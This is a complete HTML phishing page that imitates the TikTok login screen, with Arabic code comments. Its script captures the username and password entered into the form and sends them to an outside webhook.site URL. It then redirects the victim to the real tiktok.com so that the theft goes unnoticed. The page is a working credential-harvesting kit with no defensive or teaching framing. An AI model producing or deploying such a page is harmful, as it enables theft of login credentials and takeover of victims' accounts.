
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TikTok - Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: Arial, sans-serif;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f8f8f8;
    }
    .logo img {
      width: 100px;
      margin-bottom: 20px;
    }
    .login-box {
      background: white;
      padding: 30px;
      width: 350px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
    }
    .input-field {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      background: #f9f9f9;
    }
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #fe2c55;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .forgot {
      margin-top: 15px;
      font-size: 13px;
      color: #fe2c55;
      text-decoration: none;
      display: block;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/en/6/69/TikTok_logo.svg" alt="TikTok Logo">
  </div>
  <div class="login-box">
    <form id="loginForm">
      <input class="input-field" type="text" name="email" placeholder="Phone / Email / Username" required>
      <input class="input-field" type="password" name="password" placeholder="Password" required>
      <button class="login-btn" type="submit">Log in</button>
    </form>
    <a class="forgot" href="#">Forgot password?</a>
  </div>
</div>

<script>
  const webhookURL = 'https://webhook.site/15e6e8ec-5d5a-473e-aaf8-1cc442a195c9'; // لينك الويب هوك

  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const data = {
      email: document.querySelector('input[name="email"]').value,
      password: document.querySelector('input[name="password"]').value
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(() => {
      window.location.href = 'https://tiktok.com'; // يحوله عالتيك توك الحقيقي بعد الإرسال
    }).catch(err => {
      console.error(err);
    });
  });
</script>

</body>
</html>
